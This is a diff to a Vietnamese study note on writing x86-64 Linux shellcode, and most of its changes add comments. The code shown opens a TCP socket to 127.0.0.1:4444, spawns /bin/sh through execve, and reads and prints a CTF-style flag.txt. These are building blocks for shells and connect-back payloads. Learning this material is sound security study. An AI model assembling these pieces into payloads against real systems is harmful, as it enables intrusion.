@@ -57,12 +57,12 @@ Output:
 
 <img width="802" height="110" alt="image" src="https://github.com/user-attachments/assets/1a0eeb7d-6472-4c06-ae10-d5cdf481a645" />
 
-Trình tự thực thi việc kết nối:
+Trình tự thực thi việc kết nối trên:
 ```c
 tạo socket() -> tạo địa chỉ server -> kết nối connect() -> send -> đóng connection close()
 ```
 
-Chuyển sang assembly:
+Chuyển sang code assembly:
 ```asm
 ; write.asm
 section .data
@@ -73,45 +73,46 @@ section .text
 global _start
 
 _start:
-	; create socket
-	; // sock = socket(AF_INET, SOCK_STREAM, 0);
+	; // create socket
+	; sock = socket(AF_INET, SOCK_STREAM, 0);
 	mov rax, 0x29 ; 41 - socket
-	mov rdi, 2 
-	mov rsi, 1
+	mov rdi, 2  ; AF_INET = 2 (ipv4)
+	mov rsi, 1	; SOCK_STREAM = 1 (tcp)
 	mov rdx, 0
 	syscall
 
 	mov rbx, rax ; luu lai socket_fd
 
-	; open connection
-	; // connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
+	; // open connection
+	; connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
 	mov rdx, 0x0100007F   ; 127.0.01
 	push rdx
 	mov rdx, 0x5C11 ; 4444
 	push dx
-	mov rdx, 2
+	mov rdx, 2  ; ipv4
 	push dx
 
-	mov rdi, rbx 
-	mov rsi, rsp 
+	mov rdi, rbx  ; lưu fd của socket đc tạo
+	mov rsi, rsp  ; trỏ tới địa chỉ cần kết nối
 	mov rdx, 16
-	mov rax, 42
+	mov rax, 42 ; syscall của connect()
 	syscall
 
-	; write random bs
-	mov rax, 0x01
-	mov rdi, rbx
+	; // write random bs
+	; write(int fd, const void *buf, size_t count)
+	mov rax, 0x01 ; syscall cho write()
+	mov rdi, rbx  ; ket noi den fd của socket
 	mov rsi, helloTxt
 	mov rdx, len
 	syscall
 
-	; exit
+	; // exit
 	xor rax, rax
 	mov rax, 60
 	mov rdi, 0
 	syscall
 ```
-Bản cỉa thiện:
+Bản cải thiện:
 ```asm
 section .data
 helloTxt db "Hello", 10
@@ -191,7 +192,7 @@ Assembly code:
 
 	; execve("/bin/sh", null, null)
 	mov rax, 0x3b ; 59 - execve()
-	mov rdi, rsp
+	mov rdi, rsp  ; trỏ tới /bin/sh trên stack
 	mov rsi, 0	
 	mov rdx, 0
 	syscall
@@ -224,14 +225,14 @@ Output:
 Assembly code:
 ```asm
 	; file flag.txt
-    mov rbx, 0
+    mov rbx, 0 ; '\0' - null terminator cho flag
     push rbx
     mov rbx, 0x7478742e67616c66
     push rbx
 
     ; open() file
     mov rax, 2
-    mov rdi, rsp
+    mov rdi, rsp ; trỏ tới tên file đến byte null
     mov rsi, 0
     mov rdx, 0
     syscall
@@ -241,13 +242,15 @@ Assembly code:
     sub rsp, 0x50 ; tao buffer de luu flag value
 
     ; read() file to stack
+	; read(fd, buffer, 64)
     mov rax, 0
-    mov rdi, rbx
+    mov rdi, rbx ; ket noi fd từ open()
     mov rsi, rsp
     mov rdx, 64
     syscall
 
     ; write() output tu stack
+	; write(1, buffer, 64)
     mov rax, 1
     mov rdi, 1
     mov rsi, rsp
@@ -258,6 +261,10 @@ Output:
 
 <img width="817" height="71" alt="image" src="https://github.com/user-attachments/assets/ca95dccd-a7b6-44fc-babe-abe45c7aaa34" />
 
+Gom toàn bộ vào 1 code:
+```asm
+
+```
 ___
 Tài liệu:
 
